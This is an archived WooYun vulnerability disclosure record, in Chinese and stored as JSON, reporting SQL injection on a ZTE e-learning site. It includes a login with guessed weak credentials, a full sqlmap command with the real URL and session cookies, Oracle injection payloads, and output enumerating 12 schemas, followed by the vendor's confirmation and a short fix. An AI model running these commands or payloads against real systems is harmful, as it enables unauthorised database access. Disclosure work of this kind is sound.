{"id": 33655, "wybug_id": "wooyun-2015-0108327", "wybug_title": "中兴学院某处sql注射漏洞涉及12个库", "wybug_corp": "中兴通讯股份有限公司", "wybug_author": "路人甲", "wybug_date": "2015-04-19 11:18", "wybug_open_date": "2015-06-04 09:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-04：\t细节向公众公开  简要描述： 随手进去的，手贱｀｀ 详细说明：  话说，某年某月某天，无意中看到中兴还有个学院，外围看了下，没找到漏洞，发现要登入BTW，不给注册，哥郁闷咧， 于是，随手一填: 账号： 123456  密码：123456耶，居然进去了耶。 好了，那就随手找个漏洞吧。 url： http://elearning1.zte.com.cn/DistanceLearning/Application/CourseCenter/CourseBasicInfo.aspx?FromSource=20&CourseNo=55522&ApprovalFlag=&RedictToOtherCourse=false直接甩sqlmap 看看： python sqlmap.py -u\"http://elearning1.zte.com.cn/DistanceLearning/Application/CourseCenter/CourseBasicInfo.aspx?FromSource=20&CourseNo=55522&ApprovalFlag=&RedictToOtherCourse=false\" --dbms=oracle --current-user --cookie=\"_ga=GA1.3.645568543.1427683216; Hm_lvt_98a7f1bca4c6826d3079a7ea36f95f30=1427683216; Hm_lpvt_98a7f1bca4c6826d3079a7ea36f95f30=1427683234; ztesupportlang=en; ASP.NET_SessionId=1mzatg2v12lte43yaizpv2uu; ztewebstat=123456\" -p CourseNo --dbs结果： ---Parameter: CourseNo (GET)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: FromSource=20&CourseNo=55522 AND 1929=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(118)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (1929=1929) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL)&ApprovalFlag=&RedictToOtherCourse=false    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: FromSource=20&CourseNo=55522 AND 5174=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)&ApprovalFlag=&RedictToOtherCourse=false---[12:21:54] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Oracle[12:21:54] [INFO] fetching current user[12:21:54] [INFO] resumed: ELEARNINGcurrent user:    'ELEARNING'[12:21:54] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes[12:21:54] [INFO] fetching database (schema) names[12:21:55] [INFO] the SQL query used returns 12 entries[12:21:55] [INFO] retrieved: CTXSYS[12:21:56] [INFO] retrieved: ELEARNING[12:21:57] [INFO] retrieved: EMPTRAIN[12:21:58] [INFO] retrieved: EUNIV[12:22:00] [INFO] retrieved: EVALCENTER[12:22:00] [INFO] retrieved: EXFSYS[12:22:01] [INFO] retrieved: MDSYS[12:22:02] [INFO] retrieved: OLAPSYS[12:22:02] [INFO] retrieved: SYS[12:22:03] [INFO] retrieved: SYSTEM[12:22:05] [INFO] retrieved: XSEXAM[12:22:06] [INFO] retrieved: ZTETRAINavailable databases [12]:[*] CTXSYS[*] ELEARNING[*] EMPTRAIN[*] EUNIV[*] EVALCENTER[*] EXFSYS[*] MDSYS[*] OLAPSYS[*] SYS[*] SYSTEM[*] XSEXAM[*] ZTETRAIN\n\n   漏洞证明：  \n\n   修复方案：  过滤，不拼接sql ，使用安全函数   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-04-20 09:09 厂商回复： 感谢~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}